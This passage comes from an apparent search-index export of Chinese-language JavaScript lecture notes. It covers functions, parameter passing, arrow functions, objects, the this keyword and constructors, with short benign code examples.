</ul>"},{"location":"cs/mern/3403/l5/#45-associative-arrays-objects","title":"4.5 Associative Arrays - \u5373 Objects","text":"<p>\u4e2d\u7684\u672f\u8bed\u201cassociative array\u201d\u901a\u5e38\u6307\u5c06 objects \u7528\u4f5c\u952e\u503c\u5b58\u50a8\uff0c\u5176\u4e2d\u5b57\u7b26\u4e32\u503c\uff08\u5c5e\u6027\u540d\uff09\u7528\u4f5c\u201c\u7d22\u5f15\u201d\u800c\u4e0d\u662f\u6570\u5b57\u3002</p> <pre><code>let arr = {}; // \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\narr[\"name\"] = \"Bob\"; // \u5c06\u503c \"Bob\" \u5206\u914d\u7ed9\u952e \"name\"\n// arr.name \u5728\u8fd9\u91cc\u4e5f\u6709\u6548\u3002\n</code></pre> <p>\u8fd9\u4e9b\u4ece\u6839\u672c\u4e0a\u8bf4\u662f objects\u3002</p>"},{"location":"cs/mern/3403/l5/#5-functions","title":"5. Functions","text":"<p>\u51fd\u6570\u662f\u4e2d\u7684\u57fa\u672c\u6784\u5efa\u5757\uff0c\u5141\u8bb8\u4ee3\u7801\u91cd\u7528\u548c\u8fc7\u7a0b\u62bd\u8c61\u3002\u5b83\u4eec\u4e5f\u662f first-class objects\u3002</p>"},{"location":"cs/mern/3403/l5/#51-defining-a-javascript-function","title":"5.1 \u5b9a\u4e49\u51fd\u6570 (Defining a JavaScript Function)","text":"<ul> <li>Syntax\uff1a</li> </ul> <pre><code>function &lt;name&gt;(&lt;param1&gt;, &lt;param2&gt;, ...) {\n    // &lt;statement1&gt;\n    // ...\n    return &lt;value&gt;; // \u53ef\u9009\u7684 return \u8bed\u53e5\n}\n</code></pre> <p>\u4f7f\u7528 <code>function</code> \u5173\u952e\u5b57\u3002\u53c2\u6570\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\u7684\u7c7b\u578b\u3002\u5982\u679c\u7701\u7565 <code>return</code> \u8bed\u53e5\uff0c\u6216\u4f7f\u7528 <code>return;</code> \u800c\u6ca1\u6709\u503c\uff0c\u5219\u51fd\u6570\u8fd4\u56de undefined\u3002</p> <ul> <li>Placement\uff1a\u51fd\u6570\u901a\u5e38\u5fc5\u987b\u5728\u8c03\u7528\u4e4b\u524d\u5b9a\u4e49\u3002</li> </ul> <ul> <li>\u793a\u4f8b\uff1a</li> </ul> <pre><code>&lt;body&gt;&lt;h2&gt;JavaScript Functions&lt;/h2&gt;&lt;p id=\"demo\"&gt;&lt;/p&gt;&lt;script&gt;\nfunction myFunction(p1, p2) {\n  return p1 * p2;\n}\ndocument.getElementById(\"demo\").innerHTML = myFunction(4, 3); // \u8c03\u7528\u51fd\u6570\u5e76\u663e\u793a 12\n&lt;/script&gt;&lt;/body&gt;\n</code></pre>"},{"location":"cs/mern/3403/l5/#52-calling-a-javascript-function","title":"5.2 \u8c03\u7528\u51fd\u6570 (Calling a JavaScript Function)","text":"<ul> <li>Parameter Passing\uff1a</li> </ul> <ul> <li> <p>Primitive Types (Call by Value)\uff1a\u5f53\u57fa\u672c\u7c7b\u578b\u503c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u65f6\uff0c\u5b83\u4eec\u7684\u503c\u4f1a\u88ab\u590d\u5236\u3002\u51fd\u6570\u5185\u90e8\u5bf9\u53c2\u6570\u7684\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd\u5916\u90e8\u7684\u539f\u59cb\u53d8\u91cf\u3002</p> <pre><code>function run(x) {\n    x += 1;\n    return x;\n}\nlet u = 1;\nlet v = run(u);\n// \u6b64\u5904\uff0cu \u4ecd\u4e3a 1\uff0cv \u4e3a 2\n</code></pre> </li> </ul> <ul> <li> <p>Object Types (Call by Sharing/Reference)\uff1a\u5f53\u5bf9\u8c61\uff08\u5305\u62ec arrays \u548c functions\uff09\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u65f6\uff0c\u4f20\u9012\u7684\u662f\u5bf9\u539f\u59cb\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u51fd\u6570\u53ef\u4ee5\u4fee\u6539\u539f\u59cb\u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u4f46\u662f\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u7684\u53c2\u6570\u672c\u8eab\u88ab\u91cd\u65b0\u8d4b\u503c\u7ed9\u4e00\u4e2a \u65b0 \u5bf9\u8c61\uff0c\u5219\u6b64\u91cd\u65b0\u8d4b\u503c\u4e0d\u4f1a\u5f71\u54cd\u5916\u90e8\u7684\u539f\u59cb\u53d8\u91cf\u3002</p> <pre><code>function setOutOnAdventure(party1) { // party1 \u662f\u4e00\u4e2a\u6570\u7ec4\n    party1.push(\"Ivan\"); // \u4fee\u6539\u539f\u59cb\u6570\u7ec4\n    party1.push(\"Mia\");  // \u4fee\u6539\u539f\u59cb\u6570\u7ec4\n\n    let party2 = [\"Felix\", \"Jenna\", \"Sheba\"]; // \u4e00\u4e2a\u65b0\u7684\u5c40\u90e8\u6570\u7ec4\n    party1 = party2; // \u51fd\u6570\u5185\u90e8\u7684 'party1' \u73b0\u5728\u6307\u5411 'party2'\u3002\u8fd9\u4e0d\u4f1a\u6539\u53d8\u4f20\u5165\u7684\u539f\u59cb 'party1' \u6570\u7ec4\u3002\n    party1.push(\"Piers\"); // \u4fee\u6539\u5c40\u90e8\u7684 'party2'\n    return party1; // \u8fd4\u56de\u5c40\u90e8\u7684 'party1'\n}\nlet myParty = [\"Isaac\", \"Garet\"];\nlet adventureParty = setOutOnAdventure(myParty);\nconsole.log(myParty);        // \u8f93\u51fa: [\"Isaac\", \"Garet\", \"Ivan\", \"Mia\"] (\u539f\u59cb\u6570\u7ec4\u88ab\u4fee\u6539)\nconsole.log(adventureParty); // \u8f93\u51fa: [\"Felix\", \"Jenna\", \"Sheba\", \"Piers\"] (\u8fd4\u56de\u65b0\u6570\u7ec4)\n</code></pre> <p>\u51fd\u6570\u53ef\u4ee5\u5bf9\u5176\u4f20\u9012\u7684\u5bf9\u8c61\u4ea7\u751f side effects\u3002</p> </li> </ul> <ul> <li>Parameter Laxity - Banana Skin\uff1a</li> </ul> <ul> <li>Formal Parameters\uff1a\u51fd\u6570\u5b9a\u4e49\u4e2d\u547d\u540d\u7684\u53c2\u6570\u3002</li> <li>Actual Parameters\uff1a\u8c03\u7528\u51fd\u6570\u65f6\u63d0\u4f9b\u7684\u53c2\u6570\u3002</li> <li>Too Few Arguments\uff1a\u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u5c11\u4e8e\u5f62\u53c2\uff0c\u5219\u51fd\u6570\u5185\u90e8\u7f3a\u5931\u7684\u53c2\u6570\u5c06\u5177\u6709\u503c undefined\u3002</li> <li>Too Many Arguments\uff1a\u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u591a\u4e8e\u5f62\u53c2\uff0c\u5219\u989d\u5916\u7684\u53c2\u6570\u4e0d\u80fd\u901a\u8fc7\u5176\u5f62\u53c2\u540d\u79f0\u76f4\u63a5\u8bbf\u95ee\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 <code>arguments</code> \u5bf9\u8c61\u8bbf\u95ee\u5b83\u4eec\u3002</li> </ul> <ul> <li><code>arguments</code> \u5bf9\u8c61\uff1a</li> </ul> <ul> <li>\u5728\u4efb\u4f55\u975e\u7bad\u5934 (non-arrow) \u51fd\u6570\u5185\u90e8\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u540d\u4e3a <code>arguments</code> \u7684\u7279\u6b8a array-like \u5bf9\u8c61\u3002</li> </ul> <ul> <li>\u5b83\u5305\u542b\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u6240\u6709 \u5b9e\u53c2\uff0c\u800c\u4e0d\u7ba1\u5b9a\u4e49\u7684\u5f62\u53c2\u6570\u91cf\u5982\u4f55\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a<code>findMax</code> \u51fd\u6570\uff1a</p> <pre><code>function findMax() { // \u672a\u5b9a\u4e49\u5f62\u53c2\n    let max = -Infinity;\n    for (let i = 0; i &lt; arguments.length; i++) { // \u904d\u5386\u6240\u6709\u4f20\u9012\u7684\u53c2\u6570\n        if (arguments[i] &gt; max) {\n            max = arguments[i];\n        }\n    }\n    return max;\n}\nconsole.log(findMax(4, 5, 6, 2, 10)); // \u8f93\u51fa: 10\nconsole.log(findMax(1, 2));          // \u8f93\u51fa: 2\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/l5/#53-first-class-objects","title":"5.3 \u51fd\u6570\u4f5c\u4e3a First-Class Objects","text":"<p>\u5728\u4e2d\uff0c\u51fd\u6570\u662f first-class citizens\u3002\u5b83\u4eec\u50cf\u4efb\u4f55\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\u5bf9\u5f85\uff1a\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u5176\u4ed6\u51fd\u6570\uff0c\u4ece\u51fd\u6570\u8fd4\u56de\uff0c\u5e76\u5177\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <ul> <li>Accessing a Function Definition\uff1a\u5728\u4e0d\u5e26\u5706\u62ec\u53f7 <code>()</code> \u7684\u60c5\u51b5\u4e0b\u5f15\u7528\u51fd\u6570\u540d\u4f1a\u8fd4\u56de\u51fd\u6570\u5bf9\u8c61\u672c\u8eab\u3002</li> </ul> <ul> <li>Assigning Functions to Variables\uff1a</li> </ul> <pre><code>function announce() {\n    console.log(\"It's Groundhog day!\");\n}\nlet reannounce = announce; // 'reannounce' \u73b0\u5728\u5f15\u7528\u4e0e 'announce' \u76f8\u540c\u7684\u51fd\u6570\u5bf9\u8c61\nannounce();\nreannounce();\n</code></pre> <ul> <li>\u4f5c\u4e3a\u5c5e\u6027\u7684\u51fd\u6570 Methods\uff1a\u51fd\u6570\u53ef\u4ee5\u662f\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u88ab\u79f0\u4e3a methods\u3002</li> </ul> <ul> <li>Casting to String\uff1a\u5f53\u51fd\u6570\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u65f6\uff0c\u5176\u6e90\u4ee3\u7801\uff08\u5b9a\u4e49\uff09\u5c06\u4f5c\u4e3a\u6587\u672c\u8fd4\u56de\u3002</li> </ul> <ul> <li>Banana Skin\uff1a\u5c06\u51fd\u6570\u6dfb\u52a0\u5230\u5b57\u7b26\u4e32\u5c06\u5bfc\u81f4\u4e0e\u51fd\u6570\u4ee3\u7801\u7684\u5b57\u7b26\u4e32\u8fde\u63a5\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#54-anonymous-functions-arrow-functions","title":"! 5.4 Anonymous Functions - \u51fd\u6570\u8868\u8fbe\u5f0f \u548c Arrow Functions","text":"<ul> <li>Anonymous Functions\uff1a\u53ef\u4ee5\u5728\u6ca1\u6709\u540d\u79f0\u7684\u60c5\u51b5\u4e0b\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u4e9b\u901a\u5e38\u5728\u9700\u8981\u4e34\u65f6\u4f7f\u7528\u51fd\u6570\u65f6\u4f7f\u7528\uff0c\u4f8b\u5982 callback\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a<code>sort()</code> \u65b9\u6cd5\u7684\u6bd4\u8f83\u5668\uff1a<code>Array.prototype.sort()</code> \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53ef\u9009\u7684 comparator function \u4f5c\u4e3a\u53c2\u6570\u6765\u5b9a\u4e49\u6392\u5e8f\u987a\u5e8f\u3002</p> <pre><code>let points = [2, 8, 1, 5, 3, 1];\npoints.sort(); // \u9ed8\u8ba4\u6392\u5e8f\nconsole.log(points); // \u8f93\u51fa: [1, 1, 2, 3, 5, 8] (\u5bf9\u4e8e\u6570\u5b57)\n\n// \u4f7f\u7528\u533f\u540d\u51fd\u6570\u6309\u964d\u5e8f\u6392\u5e8f\npoints.sort(function(a, b) { // \u65e0\u540d\u51fd\u6570\n    return b - a;\n});\nconsole.log(points); // \u8f93\u51fa: [8, 5, 3, 2, 1, 1]\n</code></pre> </li> </ul> <ul> <li>Arrow Functions - <code>=&gt;</code> (ES6)\uff1a\u4e3a\u7f16\u5199\u533f\u540d\u51fd\u6570\u63d0\u4f9b\u4e86\u66f4\u7b80\u6d01\u7684\u8bed\u6cd5\u3002\u5b83\u4eec\u5728 <code>this</code> keyword \u65b9\u9762\u4e5f\u6709\u4e0d\u540c\u7684\u884c\u4e3a\uff08\u8bcd\u6cd5 <code>this</code>\uff09\u3002</li> </ul> <pre><code>points.sort((a, b) =&gt; { return b - a; }); // \u7bad\u5934\u51fd\u6570\u7b49\u6548\u5f62\u5f0f\n// \u5982\u679c\u51fd\u6570\u4f53\u662f\u5355\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5219\u53ef\u4ee5\u7701\u7565\u5927\u62ec\u53f7\u548c 'return'\uff1a\npoints.sort((a, b) =&gt; b - a);\n</code></pre> <p>\u8fd9\u79cd\u5c06\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7684\u80fd\u529b\u975e\u5e38\u5f3a\u5927\uff0c\u7279\u522b\u662f\u5bf9\u4e8e event handling\u3002</p> <pre><code>// \u4f20\u7edf\u51fd\u6570\nlet double = function(x) {\n  return x * 2;\n};\n\n// \u7bad\u5934\u51fd\u6570\nlet doubleArrow = x =&gt; x * 2;\n\nconsole.log(doubleArrow(5)); // \u8f93\u51fa: 10\n</code></pre>"},{"location":"cs/mern/3403/l5/#55-recursive-functions","title":"5.5 Recursive Functions","text":"<p>\u652f\u6301\u9012\u5f52\u51fd\u6570\uff08\u8c03\u7528\u81ea\u8eab\u7684\u51fd\u6570\uff09\u3002</p> <ul> <li>Named Anonymous Functions for Recursion\uff1a\u5982\u679c\u533f\u540d\u51fd\u6570\u9700\u8981\u8c03\u7528\u81ea\u8eab\uff0c\u5219\u5b83\u9700\u8981\u5728\u5176\u81ea\u8eab\u4f5c\u7528\u57df\u5185\u5177\u6709\u7528\u4e8e\u81ea\u5f15\u7528\u7684\u540d\u79f0\u3002</li> </ul> <pre><code>var ninja = {\n    yell: function cry(n) { // 'cry' \u662f\u6b64\u533f\u540d\u51fd\u6570\u5185\u90e8\u81ea\u5f15\u7528\u7684\u540d\u79f0\n        return n &gt; 0 ? cry(n - 1) + \"a\" : \"hiy\";\n    }\n};\nconsole.log(ninja.yell(5)); // \u8f93\u51fa: \"hiyaaaaa\"\n</code></pre>"},{"location":"cs/mern/3403/l5/#6-objects","title":"6. Objects","text":"<p>\u5bf9\u8c61\u662f\u7684\u6838\u5fc3\u3002\u5b83\u4eec\u662f\u540d\u79f0-\u503c\u5bf9\uff08\u5c5e\u6027\uff09\u7684\u96c6\u5408\u3002</p>"},{"location":"cs/mern/3403/l5/#61-objects","title":"6.1 \u4f5c\u4e3a\u540d\u79f0-\u503c\u5bf9\u7684 Objects","text":"<ul> <li>Structure\uff1a</li> </ul> <ul> <li>\u540d\u79f0\uff08keys\uff09\u662f\u5b57\u7b26\u4e32\u3002</li> <li>\u503c\uff08values\uff09\u53ef\u4ee5\u662f\u4efb\u4f55\u503c\uff0c\u5305\u62ec primitives\u3001\u5176\u4ed6 objects \u6216 functions\u3002</li> </ul> <ul> <li>Analogy\uff1a\u7c7b\u4f3c\u4e8e Java \u4e2d\u7684 <code>HashMap&lt;String, Object&gt;</code> \u6216 Python \u4e2d\u7684 <code>dict</code>\u3002</li> </ul> <ul> <li>Object Literals - <code>{...}</code>\uff1a\u521b\u5efa objects \u6700\u5feb\u3001\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u3002</li> </ul> <pre><code>let bubbleTea = {\n    ingredients: [\"Tea\", \"Milk\", \"Tapioca\", \"Honey\"], // \u503c\u662f\u4e00\u4e2a\u6570\u7ec4\n    taste: \"Delicious\",                             // \u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\n    timeToDrinkInSeconds: function() {                // \u503c\u662f\u4e00\u4e2a\u51fd\u6570 (\u65b9\u6cd5)\n        return 41;\n    }\n};\n</code></pre> <ul> <li>Everything Non-Primitive is an Object\uff1a\u5982\u679c\u53d8\u91cf\u4e0d\u662f primitive\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a object\u3002\u8fd9\u610f\u5473\u7740 arrays \u548c functions \u4ece\u6839\u672c\u4e0a\u8bf4\u4e5f\u662f\u5177\u6709\u7279\u6b8a\u7279\u5f81\u7684 objects\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#62-object-properties","title":"6.2 \u8bbf\u95ee\u548c\u4fee\u6539 Object Properties","text":"<ul> <li>Dot Notation\uff1a\u8bbf\u95ee\u5c5e\u6027\u7684\u6807\u51c6\u65b9\u6cd5\uff1a<code>objectName.propertyName</code>\u3002</li> </ul> <pre><code>bubbleTea.taste = \"Sublime\"; // \u4fee\u6539 'taste' \u5c5e\u6027\n</code></pre> <ul> <li>Bracket Notation - \u7c7b\u6570\u7ec4\uff1a\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u548c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u7684\u5c5e\u6027\u540d\u6765\u8bbf\u95ee\u5c5e\u6027\uff1a<code>objectName[\"propertyName\"]</code>\u3002</li> </ul> <pre><code>bubbleTea[\"taste\"] = \"Sublime\"; // \u7b49\u6548\u4e8e\u70b9\u8868\u793a\u6cd5\u793a\u4f8b\n</code></pre> <ul> <li>Advantages of Bracket Notation\uff1a</li> </ul> <ul> <li> <p>Dynamic Property Names\uff1a\u5c5e\u6027\u540d\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u8ba1\u7b97\u3002</p> <pre><code>let myProperty = \"ingredients\";\nconsole.log(bubbleTea[myProperty]); // \u8bbf\u95ee bubbleTea.ingredients\n</code></pre> </li> </ul> <ul> <li>Reserved Words as Property Names\uff1a\u53ef\u7528\u4e8e\u8bbe\u7f6e\u6216\u83b7\u53d6\u540d\u79f0\u4e3a\u4fdd\u7559\u5173\u952e\u5b57\u7684\u5c5e\u6027\u3002</li> </ul> <ul> <li>Methods\uff1a\u4f5c\u4e3a\u5bf9\u8c61\u5c5e\u6027\u7684\u51fd\u6570\u79f0\u4e3a methods\u3002</li> </ul> <ul> <li>Updating Methods at Runtime\uff1a\u7531\u4e8e\u51fd\u6570\u662f first-class objects\uff0c\u800c\u65b9\u6cd5\u53ea\u662f\u4fdd\u5b58\u51fd\u6570\u7684\u5c5e\u6027\uff0c\u56e0\u6b64\u4f60\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u901a\u8fc7\u5c06\u65b0\u51fd\u6570\u5206\u914d\u7ed9\u5c5e\u6027\u6765\u66f4\u6539\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u8fd9\u79cd\u52a8\u6001\u7279\u6027\u5141\u8bb8\u5bf9\u5bf9\u8c61\u8fdb\u884c\u201chot patching\u201d\u6216\u4fee\u6539\u884c\u4e3a\u3002</li> </ul> <pre><code>bubbleTea.timeToDrinkInSeconds = function() {\n    return \"Far too quick\"; // \u66f4\u6539\u65b9\u6cd5\u7684\u884c\u4e3a\u548c\u8fd4\u56de\u7c7b\u578b\n};\n</code></pre>"},{"location":"cs/mern/3403/l5/#63-dynamic-nature","title":"6.3 \u5bf9\u8c61\u7684 Dynamic Nature","text":"<p>\u7531\u4e8e\u5bf9\u8c61\u662f\u540d\u79f0-\u503c\u5bf9\u7684\u96c6\u5408\uff0c\u56e0\u6b64\u5176\u7ed3\u6784\u4e0d\u662f\u56fa\u5b9a\u7684\uff1a</p> <ul> <li>Adding New Properties\uff1a\u4f60\u53ef\u4ee5\u5728\u521b\u5efa\u5bf9\u8c61\u540e\u7684\u4efb\u4f55\u65f6\u95f4\u5411\u5176\u6dfb\u52a0\u65b0\u5c5e\u6027\u3002</li> </ul> <pre><code>let team = {};\nteam.attacker = \"Cloud\";\nteam.tank = \"Barret\";\nteam.healer = \"Aerith\"; // \u52a8\u6001\u6dfb\u52a0\u7684\u5c5e\u6027\n</code></pre> <ul> <li>Deleting Properties\uff1a<code>delete</code> \u8fd0\u7b97\u7b26\u53ef\u4ee5\u4ece\u5bf9\u8c61\u4e2d\u5220\u9664\u5c5e\u6027\u3002</li> </ul> <pre><code>delete team.healer; // \u5220\u9664 'healer' \u5c5e\u6027\n</code></pre> <ul> <li>\u904d\u5386\u5c5e\u6027 (<code>for...in</code> \u5faa\u73af)\uff1a\u4f60\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\u7684\u53ef\u679a\u4e3e\u5c5e\u6027\u540d\u3002</li> </ul> <pre><code>for (let role in team) { // 'role' \u5c06\u662f \"attacker\"\uff0c\u7136\u540e\u662f \"tank\"\n    console.log(role + \": \" + team[role]); // \u4f7f\u7528 team[role] \u8bbf\u95ee\u5c5e\u6027\u503c\n}\n// \u8f93\u51fa:\n// attacker: Cloud\n// tank: Barret\n</code></pre> <p>\uff08\u73b0\u4ee3\u5f15\u64ce\u901a\u5e38\u5bf9\u975e\u6574\u6570\u952e\u6309\u63d2\u5165\u987a\u5e8f\u8fed\u4ee3\uff09\u3002</p>"},{"location":"cs/mern/3403/l5/#64-the-global-object","title":"6.4 The Global Object","text":"<p>\u73af\u5883\u6709\u4e00\u4e2a\u53ef\u4ece\u4ee3\u7801\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u8bbf\u95ee\u7684 global object\u3002</p> <ul> <li>Names\uff1a</li> </ul> <ul> <li>\u5728\u6d4f\u89c8\u5668\u4e2d\uff1a<code>window</code>\u3002</li> <li>\u5728 NodeJS \u548c\u5176\u4ed6\u73af\u5883\u4e2d\uff08\u66f4\u5177\u53ef\u79fb\u690d\u6027\uff09\uff1a<code>globalThis</code>\u3002</li> </ul> <ul> <li>Implicit Global Variables\uff1a\u5728\u9876\u5c42\u58f0\u660e\u7684\u672a\u4f7f\u7528 <code>let</code> \u6216 <code>const</code> \u7684\u53d8\u91cf\u5c06\u6210\u4e3a global object \u7684\u5c5e\u6027\u3002</li> </ul> <pre><code>globalThis.x = 5; // \u663e\u5f0f\u521b\u5efa\u5168\u5c40\u5c5e\u6027\nalert(x); // \u9690\u5f0f\u8bbf\u95ee globalThis.x\n</code></pre> <ul> <li>Caution\uff1a\u901a\u5e38\u4e0d\u9f13\u52b1\u8fc7\u5ea6\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#65-this","title":"6.5 this \u5173\u952e\u5b57","text":"<p><code>this</code> keyword \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6807\u8bc6\u7b26\uff0c\u5176\u503c\u7531\u51fd\u6570\u7684\u8c03\u7528\u65b9\u5f0f\uff08\u5176 execution context\uff09\u786e\u5b9a\u3002</p> <ul> <li>Common Contexts\uff1a</li> </ul> <ul> <li> <p>In a Method\uff1a\u5f53\u51fd\u6570\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5 (<code>object.method()</code>) \u8c03\u7528\u65f6\uff0c<code>this</code> \u6307\u5411\u8c03\u7528\u8be5\u65b9\u6cd5\u7684\u5bf9\u8c61\uff08\u201cowner object\u201d\uff09\u3002</p> <pre><code>let amberPearlLatte = {\n    basePrice: 10,\n    getPrice: function() {\n        let tax = 1.25;\n        return this.basePrice * tax; // 'this' \u6307\u5411 amberPearlLatte\n    }\n};\nconsole.log(amberPearlLatte.getPrice()); // \u8f93\u51fa: 12.5\n</code></pre> </li> </ul> <ul> <li>Outside any Function, Top Level\uff1a<code>this</code> \u6307\u5411 global object (<code>window</code> \u6216 <code>globalThis</code>)\u3002</li> </ul> <ul> <li> <p>\u5728\u5e38\u89c4\u51fd\u6570\u4e2d (Not a Method, Not Arrow Function)\uff1a</p> <ul> <li>Non-Strict Mode\uff1a<code>this</code> \u4e5f\u6307\u5411 global object\u3002</li> <li>Strict Mode - <code>\"use strict\";</code>\uff1a\u5728\u76f4\u63a5\u8c03\u7528\u7684\u5e38\u89c4\u51fd\u6570\u4e2d\uff0c<code>this</code> \u662f <code>undefined</code>\u3002</li> </ul> </li> </ul> <ul> <li>In an Event Handler\uff1a<code>this</code> \u901a\u5e38\u6307\u63a5\u6536\u5230 event \u7684 HTML \u5143\u7d20\u3002</li> </ul> <ul> <li>Arrow Functions\uff1a\u7bad\u5934\u51fd\u6570\u6ca1\u6709\u81ea\u5df1\u7684 <code>this</code> binding\u3002\u5b83\u4eec\u5728\u5b9a\u4e49\u65f6\u4ece\u5176\u5468\u56f4\uff08\u8bcd\u6cd5 - lexical) \u4f5c\u7528\u57df\u7ee7\u627f <code>this</code>\u3002</li> </ul> <ul> <li><code>call()</code>\u3001<code>apply()</code>\u3001<code>bind()</code>\uff1a\u8fd9\u4e9b\u65b9\u6cd5\u53ef\u7528\u4e8e\u5728\u8c03\u7528\u51fd\u6570\u65f6\u663e\u5f0f\u8bbe\u7f6e <code>this</code> \u7684\u503c\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#66-constructors-new","title":"6.6 Constructors \u548c new \u5173\u952e\u5b57","text":"<p>\u5f53\u4f60\u9700\u8981\u521b\u5efa\u591a\u4e2a\u5177\u6709\u76f8\u4f3c\u7ed3\u6784\u548c\u884c\u4e3a\u7684\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 constructor functions\u3002</p> <ul> <li>Constructor Functions\uff1a\u4e0e <code>new</code> keyword \u4e00\u8d77\u4f7f\u7528\u4ee5\u521b\u5efa\u548c\u521d\u59cb\u5316\u5bf9\u8c61\u7684\u5e38\u89c4\u51fd\u6570\u3002</li> </ul> <ul> <li>\u6309\u7167\u7ea6\u5b9a\uff0c\u5b83\u4eec\u7684\u540d\u79f0\u5927\u5199\uff08\u4f8b\u5982\uff0c<code>Drink</code>\uff09\u3002</li> </ul> <ul> <li>\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c<code>this</code> \u6307\u5411\u6b63\u5728\u521b\u5efa\u7684\u65b0\u5bf9\u8c61\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a</p> <pre><code>function Drink(basePrice) { // \u6784\u9020\u51fd\u6570\n    this.basePrice = basePrice; // \u5728\u65b0\u5bf9\u8c61\u4e0a\u521d\u59cb\u5316\u5c5e\u6027\n    this.getPrice = function() { // \u4e3a\u65b0\u5bf9\u8c61\u5206\u914d\u4e00\u4e2a\u65b9\u6cd5\n        let tax = 1.125; // \u793a\u4f8b\u7a0e\u7387\n        return this.basePrice * tax;\n    };\n}\n</code></pre> </li> </ul> <ul> <li><code>new</code> \u5173\u952e\u5b57\uff1a\u5f53\u6267\u884c <code>new ConstructorFunction(...)</code> \u65f6\uff1a</li> </ul> <ol> <li>\u521b\u5efa\u4e00\u4e2a\u5168\u65b0\u7684\u7a7a\u5bf9\u8c61\u3002</li> <li>\u6b64\u65b0\u5bf9\u8c61\u7684 <code>prototype</code> \u8bbe\u7f6e\u4e3a <code>ConstructorFunction.prototype</code>\u3002</li> <li>\u4f7f\u7528\u6307\u5b9a\u7684\u53c2\u6570\u8c03\u7528 <code>ConstructorFunction</code>\uff0c\u5e76\u5c06 <code>this</code> \u7ed1\u5b9a\u5230\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002</li> <li>\u5982\u679c\u6784\u9020\u51fd\u6570\u6ca1\u6709\u663e\u5f0f <code>return</code> \u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u5c06\u81ea\u52a8\u4f5c\u4e3a <code>new</code> \u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u8fd4\u56de\u3002</li> </ol> <ul> <li>\u7528\u6cd5\u793a\u4f8b\uff1a</li> </ul> <pre><code>let amberPearlLatte = new Drink(10); // \u521b\u5efa\u4e00\u4e2a Drink \u5bf9\u8c61\nlet winterMelonTea = new Drink(11);  // \u521b\u5efa\u53e6\u4e00\u4e2a Drink \u5bf9\u8c61\nconsole.log(amberPearlLatte.getPrice()); // \u8c03\u7528\u6b64\u5b9e\u4f8b\u4e0a\u7684 getPrice \u65b9\u6cd5\n</code></pre> <ul> <li>Issue with Simple Constructors and Methods\uff1a\u5728\u4e0a\u9762\u7684 <code>Drink</code> \u793a\u4f8b\u4e2d\uff0c\u6bcf\u6b21\u521b\u5efa <code>Drink</code> \u5bf9\u8c61\u65f6\uff0c\u90fd\u4f1a\u4e3a <code>getPrice</code> \u521b\u5efa\u5e76\u5206\u914d\u4e00\u4e2a \u65b0 \u51fd\u6570\u5bf9\u8c61\u7ed9\u8be5\u5b9e\u4f8b\u3002\u5982\u679c\u6240\u6709\u5b9e\u4f8b\u7684\u65b9\u6cd5\u903b\u8f91\u76f8\u540c\uff0c\u5219\u6548\u7387\u4f4e\u4e0b\u3002Prototypes \u63d0\u4f9b\u4e86\u4e00\u79cd\u5171\u4eab\u65b9\u6cd5\u7684\u65b9\u6cd5\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#7-prototypes-oop","title":"7. Prototypes \u548c OOP","text":"<p>\u7684 OOP (Object-Oriented Programming) \u65b9\u6cd5\u4e0d\u540c\u4e8e\u50cf Java \u6216 C# \u8fd9\u6837\u7684 class-based \u8bed\u8a00\u3002\u5b83\u4f7f\u7528\u57fa\u4e8e prototype \u7684\u7cfb\u7edf\u3002</p> <ul> <li>Prototype-Based 